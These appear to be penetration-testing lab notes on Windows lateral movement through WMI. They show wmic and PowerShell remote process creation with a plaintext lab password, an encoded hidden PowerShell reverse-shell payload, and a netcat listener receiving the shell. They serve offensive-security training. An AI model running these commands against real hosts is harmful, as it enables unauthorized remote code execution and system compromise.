# Windows

## WMI

WMI is capable of creating processes via the _Create_ method from the _Win32\_Process_ class. It communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

### Prerequisities

* Credentials of a member of the _Administrators_ local group
* Avoid UAC Remote Restrictions for non-domain joined machine (OK for us if user is a domain user)

### Using wmic

```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```

752 -> PID

0 -> Creation of "calc" process is successfull

### Same WMI leverage using Powershell&#x20;

```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
$username = 'jen';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

### Using Reverse Shell

1. Generate powershell payload using reverse shelle generator ($command variable in the following)
2. Send the payload

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

```

3. Get reverse shell

```
nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
FILES04
```

